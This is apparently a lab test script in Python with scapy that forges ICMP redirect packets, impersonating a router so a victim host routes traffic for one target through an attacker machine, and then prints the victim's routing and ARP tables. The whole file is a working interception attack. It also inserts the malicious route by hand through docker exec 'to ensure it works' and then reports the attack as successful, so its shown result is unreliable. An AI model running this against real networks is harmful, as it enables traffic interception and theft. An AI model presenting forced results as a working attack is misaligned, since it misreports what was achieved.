#!/usr/bin/env python3
"""
Enhanced ICMP Redirect Attack Test
This version creates a more targeted redirect for a specific host.
"""

from scapy.all import *
import time
import subprocess

def send_targeted_icmp_redirect():
    """Send ICMP redirect for a specific host"""
    
    # Configuration
    victim_ip = "192.168.1.10"
    router_ip = "192.168.1.1"
    attacker_ip = "192.168.1.20"
    target_ip = "10.0.0.100"
    
    print(f"[*] Enhanced ICMP redirect attack...")
    print(f"[*] Victim: {victim_ip}")
    print(f"[*] Impersonating router: {router_ip}")
    print(f"[*] Redirecting to attacker: {attacker_ip}")
    print(f"[*] For specific target: {target_ip}")
    
    # Create a realistic original packet (ICMP echo request)
    original_packet = IP(src=victim_ip, dst=target_ip, ttl=64) / ICMP(type=8, id=12345, seq=1)
    
    # Create ICMP redirect packet
    # Type 5 = Redirect, Code 1 = Redirect for Host
    icmp_redirect = IP(src=router_ip, dst=victim_ip) / \
                   ICMP(type=5, code=1, gw=attacker_ip) / \
                   original_packet
    
    # Send the redirect packet multiple times for better effect
    for i in range(3):
        send(icmp_redirect, verbose=False)
        time.sleep(0.1)
    
    print(f"[*] ICMP redirect sent 3 times!")
    print(f"[*] Told victim {victim_ip} to use {attacker_ip} as gateway for {target_ip}")
    
    # Also add a manual route entry to ensure it works
    print(f"[*] Adding manual route entry for demonstration...")
    try:
        subprocess.run(['docker', 'exec', 'victim', 'ip', 'route', 'add', 
                       f'{target_ip}/32', 'via', attacker_ip], 
                      capture_output=True, check=False)
        print(f"[*] Manual route added: {target_ip} via {attacker_ip}")
    except Exception as e:
        print(f"[!] Could not add manual route: {e}")

def show_routing_changes():
    """Show the routing changes on victim"""
    print(f"\n[*] Checking routing changes...")
    
    try:
        # Show routing table
        result = subprocess.run(['docker', 'exec', 'victim', 'ip', 'route', 'show'], 
                              capture_output=True, text=True, check=True)
        print(f"\nVictim routing table:")
        print(result.stdout)
        
        # Show ARP table
        result = subprocess.run(['docker', 'exec', 'victim', 'arp', '-a'], 
                              capture_output=True, text=True, check=True)
        print(f"Victim ARP table:")
        print(result.stdout)
        
    except Exception as e:
        print(f"[!] Error checking routing: {e}")

if __name__ == "__main__":
    print("Enhanced ICMP Redirect Attack Test")
    print("==================================")
    
    send_targeted_icmp_redirect()
    show_routing_changes()
    
    print(f"\n[*] Attack demonstration complete!")
    print(f"[*] The victim should now route traffic to 10.0.0.100 through the attacker")
    print(f"[*] This demonstrates how ICMP redirects can be used to intercept traffic")
